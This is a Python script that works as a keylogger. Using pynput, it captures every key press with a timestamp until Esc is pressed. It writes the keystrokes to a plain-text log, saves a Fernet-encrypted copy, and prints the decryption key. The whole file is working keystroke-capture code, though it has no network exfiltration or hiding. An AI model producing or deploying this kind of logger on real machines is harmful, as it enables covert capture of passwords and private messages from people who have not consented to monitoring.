from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import logging
from datetime import datetime

def generate_key():
    return Fernet.generate_key()

def load_key():
    try:
        with open("Fernet_w.k", "rb") as key_file:
            return key_file.read()
    except FileNotFoundError:
        key = generate_key()
        with open("Fernet_w.k", "wb") as key_file:
            key_file.write(key)
        return key

key = load_key()
cipher_suite = Fernet(key)

logging.basicConfig(filename="Kr.txt",
                    level=logging.DEBUG,
                    format="%(asctime)s - %(message)s",
                    datefmt='%m-%d-%Y %H:%M:%S,%f')

keytap = []

def pres_key(key):
    timestamp = datetime.now().strftime('%m-%d-%Y %H:%M:%S,%f')
    try:
        keytap.append(f"{timestamp} - Key pressed : {key.char}")
    except AttributeError:
        keytap.append(f"{timestamp} - Special key pressed : {key}")

def store_keys(keys):
    data = "\n".join(keys)
    encrypted_data = cipher_suite.encrypt(data.encode())
    with open('Kr_encrypted.txt', 'wb') as log:
        log.write(encrypted_data)

def key_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=pres_key,on_release=key_release) as listener:
    listener.join()

with open('Kr.txt', 'w') as file:
    for keystroke in keytap:
        file.write(f"{keystroke}\n")

store_keys(keytap)

print(f"Decryption in w.k file:  {key.decode()} ")




